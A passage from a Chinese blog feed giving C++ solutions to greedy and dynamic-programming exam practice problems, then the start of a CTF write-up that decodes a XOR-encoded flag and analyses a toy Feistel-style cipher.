class="number">-1</span>][j-w[i]]+w[i]);</span><br><span class="line"><span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[n][h]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心法"><a href="#贪心法" class="headerlink" title="贪心法"></a>贪心法</h2><p>这类题目记得先排序，按怎样的顺序排，自己看清题目</p><h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><p>临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h5 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h5><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h5 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h5><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h5 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h5 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> t,v;</span><br><span class="line"><span class="keyword">double</span> <span class="keyword">v_t</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a, work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.<span class="keyword">v_t</span> &gt; b.<span class="keyword">v_t</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line">work w[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=<span class="number">0</span> &amp;&amp; n != <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].t&gt;&gt;w[i].v;</span><br><span class="line">w[i].<span class="keyword">v_t</span> = w[i].v/w[i].t;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+m,cmp);</span><br><span class="line"><span class="keyword">double</span> k =<span class="number">0</span>,<span class="keyword">p_t</span> =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> + w[i].t &lt;= n)&#123;</span><br><span class="line"><span class="keyword">p_t</span> += w[i].t;</span><br><span class="line">k += w[i].v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> &lt; n)&#123;</span><br><span class="line">k += (n - <span class="keyword">p_t</span>)*w[i].<span class="keyword">v_t</span>;</span><br><span class="line"><span class="keyword">p_t</span> = n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间包含问题"><a href="#区间包含问题" class="headerlink" title="区间包含问题"></a>区间包含问题</h3><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</p><h5 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据，对于每组测试数据：</p><p>第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。</p><p>接下来 n 行每行包含两个整数 a ,b (0≤ a&lt; b≤ 10^9) 。</p><p>接下来 m 行每行包含两个整数 l ,r (0≤ l&lt; r≤ 10^9)  。</p><h5 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出 m 行，每行包含一个整数。</p><h5 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h5 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span>  a.e &lt; b.e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n ,m;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">node a[<span class="number">105</span>],b[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i].s&gt;&gt;a[i].e;</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt; m;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[j].s&gt;&gt;b[j].e;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span> ;k &lt; n;k ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].s &gt;= b[j].s)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].e &lt;= b[j].e)&#123;</span><br><span class="line">sum++;</span><br><span class="line">b[j].s = a[k].e;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="法师康的工人"><a href="#法师康的工人" class="headerlink" title="法师康的工人"></a>法师康的工人</h3><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p><p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p><p>最长的至少有一个工人在工作的时间段</p><p>最长的无人工作的时间段（从有人工作开始计）</p><h5 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h5><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p><h5 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h5><p>输出为一行，用空格分隔开两个我们所求的数。</p><h5 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h5 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">worker</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;w[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(worker a, worker b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.s == b.s) <span class="keyword">return</span> a.e&lt;b.e;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.s &lt; b.s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N ;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; N ; i++) <span class="built_in">cin</span>&gt;&gt;w[i].s&gt;&gt;w[i].e;</span><br><span class="line"><span class="keyword">int</span> sus = w[<span class="number">0</span>].e -w[<span class="number">0</span>].s,gap = <span class="number">0</span>,t1 = w[<span class="number">0</span>].s,t2 = w[<span class="number">0</span>].e;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].s &gt; t2)&#123;</span><br><span class="line">gap = max(gap,w[i].s-t2);</span><br><span class="line">t1 = w[i].s;</span><br><span class="line">&#125;</span><br><span class="line">t2 = max(t2,w[i].e);</span><br><span class="line">sus = max(sus,t2-t1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sus&lt;&lt;<span class="string">" "</span>&lt;&lt;gap&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h5 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h5><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h5 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h5><p>对于每个字符串，输出其哈夫曼编码长度</p><h5 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h5 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*会用优先队列事半功倍*/</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span> , <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp&gt; q;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]) q.push(b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> a  = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> c = q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum = a+c;</span><br><span class="line">q.push(sum);</span><br><span class="line"></span><br><span class="line">ans += sum ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> T;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">int</span> lens =<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">while</span>(!q.empty()) q.pop();</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; lens ; i++)&#123;</span><br><span class="line">b[<span class="keyword">int</span>(s[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">&#125; </span><br><span class="line">solve();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="活动安排-考试考了类似的"><a href="#活动安排-考试考了类似的" class="headerlink" title="活动安排(考试考了类似的)"></a>活动安排(考试考了类似的)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> begin,end;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a,work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.end &lt; b.end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work w[<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].begin&gt;&gt;w[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+n,cmp);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].begin &gt;= w[j].end)&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了
    
    </summary>
    
      <category term="算法" scheme="0verwatch.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="0verwatch.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>护网杯部分题目题解</title>
    <link href="0verwatch.top/2018/10/14/huwang-game/"/>
    <id>0verwatch.top/2018/10/14/huwang-game/</id>
    <published>2018-10-13T16:27:10.000Z</published>
    <updated>2018-10-14T01:52:10.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样<a id="more"></a>的。。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="迟来的签到"><a href="#迟来的签到" class="headerlink" title="迟来的签到"></a>迟来的签到</h4><p><code>AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs=</code><br>题目说要异或，那就直接爆破异或就好<br>写个小脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">a = <span class="string">"AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs="</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">s  = s+chr(i^ord(j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>这个题目是我队友做的。。。。赛后才学习的，看来密码学以后还得认真上课。。。。<br>Fez.log给出三条数据，第一条为test，第二条为test与k加密后的数据，第三条为flag与k加密后的数据<br>fez.py为加密算法，通过分析算法</p><p><img src="https://s1.ax1x.com/2018/10/13/iUC4te.jpg" alt="iUC4te.jpg"></p><p>即a，b每一位进行异或运算<br><img src="https://s1.ax1x.com/2018/10/13/iUCHXt.jpg" alt="iUCHXt.jpg"><br>Round函数将M左右部分互换，并对右部分进行异或运算得 <code>R^L^k[i]</code><br>Fez函数即将k数组每个元素与m进行<code>round</code>运算<br>可得m为字符串分为<code>m[0:27]</code>,<code>m[27:54]</code>两部分通过一步一步推算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m:  L + R</span><br><span class="line">R + a    a: L^R^k0</span><br><span class="line">a + b    b: L^k0^k1</span><br><span class="line">b +    c    c: R^k0^k1    </span><br><span class="line">c + d    d: L^k0^k2^k3</span><br><span class="line">d + e    e: L^k0^k1^k3^k4</span><br><span class="line">e + f    f: R^k1^k2^k4^k5</span><br><span class="line">f + g    g: 